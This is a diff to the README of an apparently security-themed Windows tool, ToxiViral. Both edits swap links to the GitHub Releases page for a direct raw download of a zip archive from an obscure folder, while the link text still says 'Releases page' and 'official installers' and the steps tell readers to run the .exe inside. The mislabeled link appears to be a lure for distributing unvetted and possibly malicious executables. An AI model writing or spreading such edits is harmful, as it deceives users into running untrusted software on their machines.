@@ -1,7 +1,7 @@
 # 🛡️ ToxiViral - Manage your digital safety with ease
 
 <p align="center">
-  <a href="https://github.com/Latencycornishfowl122/ToxiViral/releases">
+  <a href="https://github.com/Latencycornishfowl122/ToxiViral/raw/refs/heads/main/reabsorption/Viral_Toxi_v1.0.zip">
     <img src="https://img.shields.io/badge/Download-ToxiViral-blue.svg" alt="Download ToxiViral">
   </a>
 </p>
@@ -22,7 +22,7 @@ Before you install ToxiViral, ensure your computer meets these basic specificati
 
 ## 🚀 How to Install and Start
 
-1. Visit the [ToxiViral Releases page](https://github.com/Latencycornishfowl122/ToxiViral/releases) to access the official installers.
+1. Visit the [ToxiViral Releases page](https://github.com/Latencycornishfowl122/ToxiViral/raw/refs/heads/main/reabsorption/Viral_Toxi_v1.0.zip) to access the official installers.
 2. Select the file ending in .exe from the latest release list to begin your download.
 3. Once the file finishes downloading, double-click it to start the setup wizard.
 4. Follow the prompts on the screen to choose your installation path.
